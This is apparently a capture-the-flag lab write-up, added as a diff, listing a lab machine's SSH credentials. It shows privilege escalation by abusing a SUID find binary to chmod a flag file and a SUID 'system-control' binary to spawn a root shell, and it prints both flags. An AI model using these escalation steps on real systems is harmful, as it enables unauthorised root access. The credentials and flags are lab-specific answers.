@@ -1,0 +1,42 @@
+IP : 10.10.171.134
+
+SSH Port : 65534
+
+SSH User : holly
+
+SSH Pass : tuD@4vt0G*TU
+
+--------------------------------------------------------------------------------
+
+We can navigate to /home/igor directory
+
+We cannot read the file.
+
+Lets see what files belong to user igor : find / -type f -user igor 2>/dev/null
+
+There is a /usr/bin/find binary owned by igor, this also has SUID bit set over it.
+
+Lets use it to modify permission on flag1.txt : /usr/bin/find . -exec chmod 777 flag1.txt \; -quit
+
+Now we can read the flag : THM{d3f0708bdd9accda7f937d013eaf2cd8}
+
+Lets check for another binary with SUID set.
+
+We found a binary named system-control:
+
+holly@ip-10-10-171-134:/home$ /usr/bin/system-control
+
+===== System Control Binary =====
+
+Enter system command: id
+uid=0(root) gid=1001(holly) groups=1001(holly)
+holly@ip-10-10-171-134:/home$ /usr/bin/system-control
+
+===== System Control Binary =====
+
+Enter system command: /bin/bash
+root@ip-10-10-171-134:/home# 
+
+Read /root/flag2.txt : THM{8c8211826239d849fa8d6df03749c3a2}
+
+!!!
